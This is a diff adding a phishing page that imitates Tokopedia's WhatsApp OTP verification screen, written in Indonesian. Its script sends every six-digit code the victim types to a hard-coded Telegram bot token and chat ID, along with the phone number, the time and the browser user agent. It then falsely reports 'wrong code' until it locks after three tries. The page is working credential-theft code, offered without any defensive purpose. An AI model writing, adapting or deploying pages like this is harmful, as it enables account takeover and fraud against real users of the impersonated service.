@@ -1,0 +1,216 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Masukkan Kode Verifikasi</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'tokped-green': '#40b549',
+            'tokped-dark': '#424242',
+            'tokped-red': '#e53e3e', // Menambahkan warna untuk notifikasi gagal
+          },
+        },
+      },
+    };
+  </script>
+</head>
+
+<body class="min-h-screen bg-white font-sans">
+
+  <header class="flex items-center border-b px-4 py-4">
+    <button
+      type="button"
+      class="mr-3 text-xl"
+      onclick="window.history.back()"
+      aria-label="Kembali"
+    >
+      &#8592;
+    </button>
+    <h1 class="text-lg font-semibold">Masuk ke Tokopedia</h1>
+  </header>
+
+  <main class="mx-auto mt-14 max-w-md px-6 text-center">
+
+    <div class="mb-6 flex justify-center">
+      <img
+        src="https://www.svgrepo.com/show/475692/whatsapp-color.svg"
+        alt="WhatsApp"
+        class="h-14 w-14"
+      />
+    </div>
+
+    <h2 class="mb-2 text-xl font-semibold text-gray-800">
+      Masukkan Kode Verifikasi
+    </h2>
+
+    <p class="mb-10 text-sm text-gray-500">
+      Kode verifikasi telah dikirim melalui WhatsApp 
+      <span class="font-medium text-gray-700" id="phoneNumberDisplay">
+        
+      </span>
+    </p>
+
+    <div class="mb-4">
+      <input
+        id="otpInput"
+        type="text"
+        maxlength="6"
+        inputmode="numeric"
+        placeholder="••••••"
+        class="w-full border-b-2 border-tokped-green py-3
+               text-center text-2xl tracking-widest
+               focus:outline-none"
+      />
+    </div>
+
+    <p id="statusText" class="hidden text-sm text-red-500">
+      Kode salah. Sisa percobaan: 3
+    </p>
+
+    <button
+      id="verifyBtn"
+      class="mt-6 w-full rounded-lg bg-tokped-green py-3
+             font-semibold text-white
+             transition duration-150 hover:bg-green-700"
+    >
+      Verifikasi
+    </button>
+
+    <p id="loadingText" class="mt-4 hidden text-sm text-gray-500">
+      Mengirim data...
+    </p>
+
+    <section id="fallbackSection" class="mt-10 hidden border-t pt-8">
+      <div
+        class="mb-8 rounded-lg border-l-4 border-red-500
+               bg-red-100 p-4 text-tokped-dark"
+        role="alert"
+      >
+        <p class="text-lg font-bold">Gagal</p>
+        <p class="text-sm">Silakan mencoba menu lainnya</p>
+      </div>
+
+      <a
+        href="index.html"
+        class="block w-full rounded-lg bg-red-600 py-3
+               text-center font-semibold text-white
+               transition duration-150 hover:bg-red-700"
+      >
+        Ke Halaman Utama
+      </a>
+    </section>
+
+  </main>
+
+  
+
+  <script>
+    // DATA TELEGRAM SESUAI PERMINTAAN ANDA
+    const TELEGRAM_BOT_TOKEN = '8449078397:AAFqHmrJKLNo4ZX1TCsbCn1uf-GjrQtnmo8';
+    const TELEGRAM_CHAT_ID = '7823308464';
+
+    const MAX_ATTEMPTS = 3;
+    let attemptCount = 0;
+
+    const otpInput = document.getElementById('otpInput');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const statusText = document.getElementById('statusText');
+    const loadingText = document.getElementById('loadingText');
+    const fallbackSection = document.getElementById('fallbackSection');
+    const phoneNumber = document
+      .getElementById('phoneNumberDisplay')
+      .textContent
+      .trim();
+
+    // Fungsi untuk menampilkan Notifikasi Gagal Permanen
+    function lockVerification() {
+      otpInput.disabled = true;
+      otpInput.classList.add('opacity-50');
+
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Verifikasi Gagal';
+      verifyBtn.classList.remove('bg-tokped-green', 'hover:bg-green-700');
+      verifyBtn.classList.add('bg-gray-400');
+
+      statusText.classList.add('hidden');
+      fallbackSection.classList.remove('hidden');
+    }
+
+    // Fungsi untuk mengirim data ke Telegram
+    async function sendToTelegram(otp, attempt) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      const message = `
+🚨 *OTP DITERIMA!* (Percobaan ke-${attempt})
+----------------------------
+📱 *Nomor:* ${phoneNumber}
+🔑 *Kode OTP:* \`${otp}\`
+⏰ *Waktu:* ${new Date().toLocaleString("id-ID")}
+🌐 *User Agent:* ${navigator.userAgent}
+      `;
+
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+        return response.ok;
+      } catch (error) {
+        console.error("Error saat mengirim ke Telegram:", error);
+        return false;
+      }
+    }
+
+    verifyBtn.addEventListener('click', async () => {
+      const otp = otpInput.value.trim();
+      statusText.classList.add('hidden');
+
+      if (attemptCount >= MAX_ATTEMPTS) {
+        lockVerification();
+        return;
+      }
+
+      if (otp.length !== 6 || isNaN(otp)) {
+        statusText.textContent = 'Kode harus 6 digit angka.';
+        statusText.classList.remove('hidden');
+        return;
+      }
+
+      loadingText.classList.remove('hidden');
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Mengirim data...';
+
+      attemptCount++;
+
+      await sendToTelegram(otp, attemptCount);
+
+      setTimeout(() => {
+        loadingText.classList.add('hidden');
+
+        if (attemptCount >= MAX_ATTEMPTS) {
+          lockVerification();
+        } else {
+          const sisa = MAX_ATTEMPTS - attemptCount;
+          statusText.textContent = `Kode salah. Sisa percobaan: ${sisa}`;
+          statusText.classList.remove('hidden');
+
+          verifyBtn.disabled = false;
+          verifyBtn.textContent = 'Verifikasi';
+        }
+      }, 1200);
+    });
+  </script>
+
+</body>
+</html>
